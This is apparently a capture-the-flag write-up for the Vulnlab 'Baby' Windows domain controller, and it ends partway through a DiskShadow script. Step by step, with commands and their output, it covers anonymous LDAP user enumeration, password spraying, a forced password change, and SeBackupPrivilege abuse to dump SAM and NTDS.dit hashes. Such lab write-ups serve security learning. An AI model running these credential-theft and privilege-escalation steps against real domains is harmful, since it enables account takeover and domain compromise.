@@ -1,0 +1,489 @@
+<table>
+<thead>
+<tr>
+<th>Machine Name</th>
+<th>OS</th>
+<th>Difficulty</th>
+<th>Date Started</th>
+<th>Date Completed</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Baby</td>
+<td>Windows</td>
+<td>Easy</td>
+<td>10/12/2024</td>
+<td>10/12/2024</td>
+</tr>
+</tbody>
+</table>
+<p dir="auto"><em>Vulnlab.com</em>  </p>
+<hr>
+<p dir="auto">Learning Points :</p>
+<ul>
+<li dir="auto">Domain credentials are stored in the <code>NTDS.dit</code> file on the domain controller.  </li>
+<li dir="auto">A new technique to copy and dump domain hashes when <code>SeBackupPrivilege</code> is enabled.  </li>
+<li dir="auto">Using <code>smbpasswd</code> to change the password of a user in a domain when the password change is required.</li>
+</ul>
+<hr>
+<p dir="auto">Attack Path : </p>
+<ol>
+<li dir="auto">Identified open ports using <code>rustscan</code>.  </li>
+<li dir="auto">Discovered 10 usernames using <a data-tooltip-position="top" aria-label="https://github.com/ropnop/windapsearch" rel="noopener nofollow" class="external-link" href="https://github.com/ropnop/windapsearch" target="_blank"><strong>winldapsearch</strong></a>.  </li>
+<li dir="auto">Found a password in user descriptions using <code>ldapsearch</code>.  </li>
+<li dir="auto">Performed a <strong>password spray</strong> attack and identified that <code>Caroline.Robinson</code> had the password, but it needed to be changed.  </li>
+<li dir="auto">Changed the password of <code>Caroline.Robinson</code> using <code>smbpasswd</code>.  </li>
+<li dir="auto">Confirmed access and logged into the machine using <strong>Evil-WinRM</strong>.  </li>
+<li dir="auto">Identified that <code>SeBackupPrivilege</code> was enabled.  </li>
+<li dir="auto">Copied the <code>SAM</code> and <code>SYSTEM</code> hives to a temp folder using <code>SeBackupPrivilege</code>.  </li>
+<li dir="auto">Downloaded the files and dumped the hashes, including the local administrator hash, using <code>impacket-secretsdump</code>.  </li>
+<li dir="auto">Abused <strong>DiskShadow</strong> to dump the domain hashes and the <code>ntds.dit</code> file.  </li>
+<li dir="auto">Used the domain admin hash to log in with <strong>Evil-WinRM</strong> and obtained the <strong>root flag</strong>.  </li>
+</ol>
+<hr>
+<p dir="auto">Activity Log :</p>
+<ul>
+<li dir="auto">Ran a <code>rustscan</code> to identify open ports.</li>
+<li dir="auto">Checked for accessible SMB shares as <code>guest</code>/<code>null</code> and didn’t find anything useful.</li>
+<li dir="auto">Enumerated the ports <code>5357</code> and <code>5985</code> but couldn’t find anything useful.</li>
+<li dir="auto">Tried RID brute-forcing through <code>CrackMapExec</code> as a <code>guest</code> user and failed.</li>
+<li dir="auto">Tried an LDAP search but couldn’t connect.</li>
+<li dir="auto">Ran <strong>Responder</strong> in the background but didn’t find anything.</li>
+<li dir="auto">Ran <code>kerbrute</code> user enumeration and found only the <code>administrator</code> user.</li>
+<li dir="auto">Used <a data-tooltip-position="top" aria-label="https://github.com/ropnop/windapsearch" rel="noopener nofollow" class="external-link" href="https://github.com/ropnop/windapsearch" target="_blank"><strong>winldapsearch</strong></a> and found 10 usernames.</li>
+<li dir="auto">Tried an ASREPRoast attack for the 10 users but failed.</li>
+<li dir="auto">Used <code>ldapsearch</code> to look at the user descriptions and found a password.</li>
+<li dir="auto">Performed a password spray for the 10 users and found that the <code>Caroline.Robinson</code> user had the password but it had to be changed.</li>
+<li dir="auto">Used <code>smbpasswd</code> to change the password of the user.</li>
+<li dir="auto">Enumerated available SMB shares for the user.</li>
+<li dir="auto">Confirmed that the user could use <strong>Evil-WinRM</strong> to log in to the machine.</li>
+<li dir="auto">Logged in to the machine and got the <strong>user flag</strong>.</li>
+<li dir="auto">Checked the privileges and found that <code>SeBackupPrivilege</code> is enabled.</li>
+<li dir="auto">Created a temp folder and copied the <code>SAM</code> and <code>SYSTEM</code> hives to the temp folder.</li>
+<li dir="auto">Downloaded both files to <strong>Falcon</strong> and used <code>impacket-secretsdump</code> to dump the hashes, including the administrator hash (later found out it was the local administrator hash).</li>
+<li dir="auto">Used the admin hash to perform a pass-the-hash attack using <strong>Evil-WinRM</strong>, but failed.</li>
+<li dir="auto">Learned that the domain credentials are stored in the <code>ntds.dit</code> file.</li>
+<li dir="auto">Abused <strong>DiskShadow</strong> along with <code>SeBackupPrivilege</code> and saved and downloaded the <code>ntds.dit</code> file.</li>
+<li dir="auto">Dumped the domain hashes, including the domain admins, using <code>secretsdump.py</code>.</li>
+<li dir="auto">Logged in using <strong>Evil-WinRM</strong> from the domain admin’s hash with a pass-the-hash attack and got the <strong>root flag</strong>.</li>
+</ul>
+<hr>
+<h3 data-heading="Enumeration" dir="auto">Enumeration</h3>
+<p dir="auto"><em>Rustscan :</em></p>
+<pre><code>destiny@falcon:~$ rustscan -a 10.10.97.214
+Open 10.10.97.214:53
+Open 10.10.97.214:88
+Open 10.10.97.214:135
+Open 10.10.97.214:139
+Open 10.10.97.214:389
+Open 10.10.97.214:445
+Open 10.10.97.214:464
+Open 10.10.97.214:636
+Open 10.10.97.214:593
+Open 10.10.97.214:3269
+Open 10.10.97.214:3268
+Open 10.10.97.214:3389
+Open 10.10.97.214:5357
+Open 10.10.97.214:5985
+Open 10.10.97.214:9389
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto"><em>Nmap scan :</em></p>
+<pre><code>PORT     STATE SERVICE           VERSION
+53/tcp   open  domain            Simple DNS Plus88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-12-10 10:33:00Z)
+135/tcp  open  msrpc             Microsoft Windows RPC
+139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ldapssl?
+3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
+3269/tcp open  globalcatLDAPssl?
+3389/tcp open  ms-wbt-server     Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: BABY
+|   NetBIOS_Domain_Name: BABY
+|   NetBIOS_Computer_Name: BABYDC
+|   DNS_Domain_Name: baby.vl
+|   DNS_Computer_Name: BabyDC.baby.vl
+|   Product_Version: 10.0.20348
+|_  System_Time: 2024-12-10T10:33:21+00:00
+| ssl-cert: Subject: commonName=BabyDC.baby.vl
+| Not valid before: 2024-07-26T09:03:15
+|_Not valid after:  2025-01-25T09:03:15
+|_ssl-date: 2024-12-10T10:34:01+00:00; 0s from scanner time.
+5357/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Service Unavailable
+|_http-server-header: Microsoft-HTTPAPI/2.0
+5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp open  mc-nmf            .NET Message Framing
+Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2024-12-10T10:33:22
+|_  start_date: N/A
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto">Enumerated ports <code>5357</code> and <code>5985</code> but couldn't find anything useful.</p>
+<pre><code>destiny@falcon:~/vpn$ curl http://10.10.97.214:5357   
+&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd"&gt;
+&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;Service Unavailable&lt;/TITLE&gt;
+&lt;META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"&gt;&lt;/HEAD&gt;
+&lt;BODY&gt;&lt;h2&gt;Service Unavailable&lt;/h2&gt;
+&lt;hr&gt;&lt;p&gt;HTTP Error 503. The service is unavailable.&lt;/p&gt;
+&lt;/BODY&gt;&lt;/HTML&gt;
+
+destiny@falcon:~/vpn$ curl http://10.10.97.214:5985
+&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd"&gt;
+&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;Not Found&lt;/TITLE&gt;
+&lt;META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"&gt;&lt;/HEAD&gt;
+&lt;BODY&gt;&lt;h2&gt;Not Found&lt;/h2&gt;
+&lt;hr&gt;&lt;p&gt;HTTP Error 404. The requested resource is not found.&lt;/p&gt;
+&lt;/BODY&gt;&lt;/HTML&gt;
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto">Tried RID brute-forcing using Crackmapexec as the <code>guest</code> user but failed:</p>
+<pre><code>destiny@falcon:~/vpn$ crackmapexec smb baby.vl -u guest -p '' --rid-brute
+SMB         baby.vl         445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
+SMB         baby.vl         445    BABYDC           [-] baby.vl\guest: STATUS_ACCOUNT_DISABLED 
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto">Tried an LDAP search but didn't find anything useful in the first attempt.</p>
+<pre><code>destiny@falcon:~/vpn$ ldapsearch -H ldaps://baby.vl:636/ -x -s base -b '' "(objectClass=*)" "*" +
+
+ldap_sasl_bind(SIMPLE): Can't contact LDAP server (-1)
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto">Ran Kerbrute user enumeration and found only the <code>administrator</code> user.</p>
+<pre><code>destiny@falcon:/usr/share/wordlists$ kerbrute userenum -d baby.vl /usr/share/wordlists/xato-net-10-million-usernames.txt --dc baby.vl            
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 12/10/24 - Ronnie Flathers @ropnop
+
+2024/12/10 16:39:21 &gt;  Using KDC(s):
+2024/12/10 16:39:21 &gt;   baby.vl:88
+
+2024/12/10 16:39:50 &gt;  [+] VALID USERNAME:       administrator@baby.vl
+2024/12/10 16:43:00 &gt;  [+] VALID USERNAME:       Administrator@baby.vl
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto">After researching and reviewing the enumeration part of the <code>Cascade</code> box on Hack The Box, we discovered a tool called <a data-tooltip-position="top" aria-label="https://github.com/ropnop/windapsearch" rel="noopener nofollow" class="external-link" href="https://github.com/ropnop/windapsearch" target="_blank">winldapsearch</a> that we could use to dump the users without needing credentials by using LDAP.</p>
+<pre><code>destiny@falcon:/tmp/windapsearch$ python3 windapsearch.py  -d baby.vl --dc-ip 10.10.95.143 --users  
+[+] No username provided. Will try anonymous bind.
+[+] Using Domain Controller at: 10.10.95.143
+[+] Getting defaultNamingContext from Root DSE
+[+]     Found: DC=baby,DC=vl
+[+] Attempting bind
+[+]     ...success! Binded as: 
+[+]      None
+[+] Enumerating all AD users
+[+]     Found 10 users: 
+
+cn: Guest
+
+cn: Jacqueline Barnett
+userPrincipalName: Jacqueline.Barnett@baby.vl
+cn: Ashley Webb
+userPrincipalName: Ashley.Webb@baby.vl
+cn: Hugh George
+userPrincipalName: Hugh.George@baby.vl
+cn: Leonard Dyer
+userPrincipalName: Leonard.Dyer@baby.vl
+cn: Connor Wilkinson
+userPrincipalName: Connor.Wilkinson@baby.vl
+cn: Joseph Hughes
+userPrincipalName: Joseph.Hughes@baby.vl
+cn: Kerry Wilson
+userPrincipalName: Kerry.Wilson@baby.vl
+cn: Teresa Bell
+userPrincipalName: Teresa.Bell@baby.vl
+cn: Caroline Robinson
+userPrincipalName: Caroline.Robinson@baby.vl
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto"><em>Filtered (users.txt) :</em></p>
+<pre><code>Jacqueline.Barnett  
+Ashley.Webb  
+Hugh.George  
+Leonard.Dyer  
+Connor.Wilkinson  
+Joseph.Hughes  
+Kerry.Wilson  
+Teresa.Bell  
+Caroline.Robinson  
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto">Tried an ASREPRoast attack but did not receive any user hashes.</p>
+<pre><code>destiny@falcon:~/vulnlab.com/Baby-W$ impacket-GetNPUsers baby.vl/ -usersfile users.txt -dc-ip 10.10.95.143 -format hashcat -outputfile asreproast_hashes.txt 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
+[-] User Jacqueline.Barnett doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Ashley.Webb doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Hugh.George doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Leonard.Dyer doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Connor.Wilkinson doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Joseph.Hughes doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Kerry.Wilson doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Teresa.Bell doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Caroline.Robinson doesn't have UF_DONT_REQUIRE_PREAUTH set
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<hr>
+<blockquote dir="auto">
+<p>Found in a Medium article that we can also use <code>ldapsearch</code> to perform user enumeration.</p>
+</blockquote>
+<pre><code>destiny@falcon:~/vulnlab.com/Baby-W$ ldapsearch -x -H ldap://10.10.95.143 -D '' -w '' -b "DC=baby,DC=vl" | grep sAMAccountName | awk -F: '{ print $2 }' |  awk '{ gsub(/ /,""); print }'
+Guest
+DomainComputers
+CertPublishers
+DomainUsers
+DomainGuests
+GroupPolicyCreatorOwners
+RASandIASServers
+AllowedRODCPasswordReplicationGroup
+DeniedRODCPasswordReplicationGroup
+EnterpriseRead-onlyDomainControllers
+CloneableDomainControllers
+ProtectedUsers
+DnsAdmins
+DnsUpdateProxy
+dev
+Jacqueline.Barnett
+Ashley.Webb
+Hugh.George
+Leonard.Dyer
+it
+Connor.Wilkinson
+Joseph.Hughes
+Kerry.Wilson
+Teresa.Bell
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<hr>
+<p dir="auto">While reviewing the user descriptions, we found a password: <code>BabyStart123!</code>.</p>
+<pre><code>destiny@falcon:~/vulnlab.com/Baby-W$ ldapsearch -x -H ldap://10.10.95.143 -D '' -w '' -b "DC=baby,DC=vl" | grep description
+description: Built-in account for guest access to the computer/domain
+description: All workstations and servers joined to the domain
+description: Members of this group are permitted to publish certificates to th
+description: All domain users
+description: All domain guests
+description: Members in this group can modify group policy for the domain
+description: Servers in this group can access remote access properties of user
+description: Members in this group can have their passwords replicated to all 
+description: Members in this group cannot have their passwords replicated to a
+description: Members of this group are Read-Only Domain Controllers in the ent
+description: Members of this group that are domain controllers may be cloned.
+description: Members of this group are afforded additional protections against
+description: DNS Administrators Group
+description: DNS clients who are permitted to perform dynamic updates on behal
+description: Set initial password to BabyStart123!
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<h3 data-heading="Initial Access" dir="auto">Initial Access</h3>
+<p dir="auto">We performed a password spray attack using the user list we had and the password we just discovered with CrackMapExec. The user <code>Caroline.Robinson</code> received the response <code>STATUS_PASSWORD_MUST_CHANGE</code>.</p>
+<img src="attachments/a3e52eeea2e1212ad19ce6d09833c0d6.png" referrerpolicy="no-referrer">
+<p dir="auto">We used the Impacket <code>smbpasswd</code> tool to change the password of the user <code>Caroline.Robinson</code> to <code>Password123##</code>.</p>
+<pre><code>destiny@falcon:~/vulnlab.com/Baby-W$ smbpasswd -r 10.10.95.143 -U Caroline.Robinson
+
+Old SMB password:
+New SMB password:
+Retype new SMB password:
+
+Password changed for user Caroline.Robinson
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto">We confirmed that our password was changed using CrackMapExec.</p>
+<pre><code>destiny@falcon:~/vulnlab.com/Baby-W$ crackmapexec smb baby.vl -u Caroline.Robinson -p 'Password123##'
+
+SMB baby.vl 445 BABYDC [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
+
+SMB baby.vl 445 BABYDC [+] baby.vl\Caroline.Robinson:Password123##
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto">Enumerated the available SMB shares for the user.</p>
+<img src="attachments/ebe80fb5b9fdbc890603c11821f24f09.png" referrerpolicy="no-referrer">
+<p dir="auto">We also checked if we could use the WinRM protocol to log in as this user, as we remembered the port was open from the Nmap scan, and confirmed we had access.</p>
+<pre><code>destiny@falcon:~/vulnlab.com/Baby-W$ crackmapexec winrm baby.vl -u Caroline.Robinson -p 'Password123##' 
+SMB         baby.vl         5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
+HTTP        baby.vl         5985   BABYDC           [*] http://baby.vl:5985/wsman
+WINRM       baby.vl         5985   BABYDC           [+] baby.vl\Caroline.Robinson:Password123## (Pwn3d!)
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto">We logged into the machine using the credentials and obtained the user flag.</p>
+<pre><code>destiny@falcon:~/vulnlab.com/Baby-W$ evil-winrm -i baby.vl -u 'Caroline.Robinson' -p 'Password123##' 
+
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop&gt; ls
+
+
+    Directory: C:\Users\Caroline.Robinson\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         6/21/2016   3:36 PM            527 EC2 Feedback.website
+-a----         6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
+-a----        11/21/2021   3:24 PM             36 user.txt
+
+
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop&gt; type user.txt
+VL{b2c6150b85125d32f4b253df9540d898}
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<h3 data-heading="Privilege Escalation" dir="auto">Privilege Escalation</h3>
+<p dir="auto">After checking the available privileges, we were able to see that <code>SeBackupPrivilege</code> is enabled.</p>
+<pre><code>*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto">As per this <a data-tooltip-position="top" aria-label="https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md" rel="noopener nofollow" class="external-link" href="https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md" target="_blank">note</a> on abusing <code>SeBackupPrivilege</code>, we saved the SAM and SYSTEM hives to a temporary folder.</p>
+<pre><code>*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop&gt; mkdir C:\temp
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop&gt; reg save hklm\sam C:\temp\sam.hive
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop&gt; reg save hklm\system C:\temp\system.hive
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto">Downloaded the files to Falcon and used <code>impacket-secretsdump</code> to dump the hashes, including the Administrator hash.</p>
+<pre><code>destiny@falcon:~/vulnlab.com/Baby-W$ impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
+[*] Cleaning up... 
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto">Used the admin hash to perform a pass-the-hash attack with Evil-WinRM, but was unable to log in.</p>
+<img src="attachments/53dc00efd7e011b261b728c33dd3f190.png" referrerpolicy="no-referrer">
+<blockquote dir="auto">
+<p>In a Windows domain environment, domain administrator (Domain Admin) password hashes are stored in the&nbsp;<strong>NTDS.dit</strong> file</p>
+</blockquote>
+<p dir="auto">We didn't have permission to copy the <code>NTDS.dit</code> file as we did with the previous files.</p>
+<pre><code>*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents&gt; copy C:\Windows\NTDS\NTDS.dit C:\temp\NTDS.dit
+Access to the path 'C:\Windows\NTDS\NTDS.dit' is denied.
+At line:1 char:1
++ copy C:\Windows\NTDS\NTDS.dit C:\temp\NTDS.dit
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\Windows\NTDS\NTDS.dit:FileInfo) [Copy-Item], UnauthorizedAccessException
+    + FullyQualifiedErrorId : CopyFileInfoItemUnauthorizedAccessError,Microsoft.PowerShell.Commands.CopyItemCommand
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<hr>
+<h4 data-heading="Copying the&nbsp;`ntds.dit`&nbsp;File Using SeBackupPrivilege Abuse" dir="auto">Copying the&nbsp;<code>ntds.dit</code>&nbsp;File Using SeBackupPrivilege Abuse</h4>
+<p dir="auto"><em>Create the Diskshadow commands with the following content:</em></p>
+<pre><code>set context persistent nowriters  
+add volume c: alias persecure  
+create  
+expose %persecure% z:
